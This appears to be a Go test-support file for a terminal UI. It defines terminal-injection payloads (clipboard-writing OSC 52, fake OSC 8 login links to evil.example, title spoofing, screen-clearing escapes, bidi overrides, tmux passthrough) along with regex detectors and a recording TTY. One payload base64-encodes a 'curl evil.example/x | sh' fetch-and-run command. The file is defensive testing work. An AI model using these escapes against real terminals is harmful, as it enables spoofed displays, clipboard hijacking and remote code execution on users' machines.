// Package hostile is test support: the hostile fixture's attacks, a
// scan of what reached a terminal for each, and a terminal that
// records what tcell writes. Only tests import it.
package hostile

import (
	"bytes"
	"io"
	"regexp"
	"sort"
	"sync"

	"github.com/gdamore/tcell/v2"
	"github.com/gdamore/tcell/v2/terminfo"
)

// Payloads are the hostile fixture's attacks: tags that colour, style,
// make regions and make links, and the escapes termtext already makes
// visible.
var Payloads = map[string]string{
	"osc52":   "\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUveCB8IHNo\x07",
	"osc8":    "\x1b]8;;https://evil.example/login\x1b\\motel login\x1b]8;;\x1b\\",
	"title":   "\x1b]0;motel: all healthy\x07",
	"csi":     "\x1b[5A\x1b[2K\x1b[10C",
	"clear":   "\x1b[2J\x1b[H",
	"bidi":    "\u202elmth.exe\u202c",
	"c1":      "\u009b31m",
	"c1raw":   "\x9b2J",
	"tags":    `[red]FAKE[-] ["region"]hidden[""] [::b]bold[::-] [green]healthy[-]`,
	"badutf8": "\xff\xfe",
	"urltag":  "[:::https://evil.example/tag]motel login[:::-]",
	"dcs":     "\x1bPtmux;\x1b\x1b]52;c;Y3VybA==\x07\x1b\\",
	"apc":     "\x1b_Gf=100,a=T;AAAA\x1b\\",
}

// signatures are bytes that, written to a terminal, mean an attack
// reached it live. tcell's own sequences match none of them.
var signatures = map[string]*regexp.Regexp{
	"osc52":         regexp.MustCompile(`\x1b\]52;`),
	"osc8 link":     regexp.MustCompile(`\x1b\]8;[^\x07\x1b]*evil\.example`),
	"dcs":           regexp.MustCompile(`\x1bPtmux;`),
	"apc":           regexp.MustCompile(`\x1b_G`),
	"title":         regexp.MustCompile(`\x1b\]0;motel`),
	"cursor up 5":   regexp.MustCompile(`\x1b\[5A`),
	"erase line":    regexp.MustCompile(`\x1b\[2K`),
	"bidi":          regexp.MustCompile("\u202e"),
	"c1":            regexp.MustCompile("\u009b"),
	"invalid utf-8": regexp.MustCompile(`\xff\xfe`),
}

func Scan(out []byte) []string {
	var found []string
	for name, re := range signatures {
		if re.Match(out) {
			found = append(found, name)
		}
	}
	sort.Strings(found)
	return found
}

// TTY is a terminal for tcell's real terminfo screen: it records
// every byte tcell writes.
type TTY struct {
	in     *io.PipeReader
	typing *io.PipeWriter
	mu     sync.Mutex
	out    bytes.Buffer
}

func NewTTY() *TTY {
	r, w := io.Pipe()
	return &TTY{in: r, typing: w}
}

func (f *TTY) Start() error               { return nil }
func (f *TTY) Stop() error                { return nil }
func (f *TTY) Drain() error               { _ = f.typing.Close(); return nil }
func (f *TTY) NotifyResize(func())        {}
func (f *TTY) Read(p []byte) (int, error) { return f.in.Read(p) }
func (f *TTY) Close() error               { _ = f.typing.Close(); return nil }
func (f *TTY) WindowSize() (tcell.WindowSize, error) {
	return tcell.WindowSize{Width: 100, Height: 30}, nil
}
func (f *TTY) Write(p []byte) (int, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.out.Write(p)
}
func (f *TTY) Bytes() []byte {
	f.mu.Lock()
	defer f.mu.Unlock()
	return append([]byte(nil), f.out.Bytes()...)
}

// Screen is tcell's real terminfo screen over tty. It is not
// initialised here: tview's SetScreen does that, and a second Init
// leaves tcell's buffer at the terminfo's width.
func Screen(tty *TTY) (tcell.Screen, error) {
	ti, err := terminfo.LookupTerminfo("xterm-256color")
	if err != nil {
		return nil, err
	}
	return tcell.NewTerminfoScreenFromTtyTerminfo(tty, ti)
}
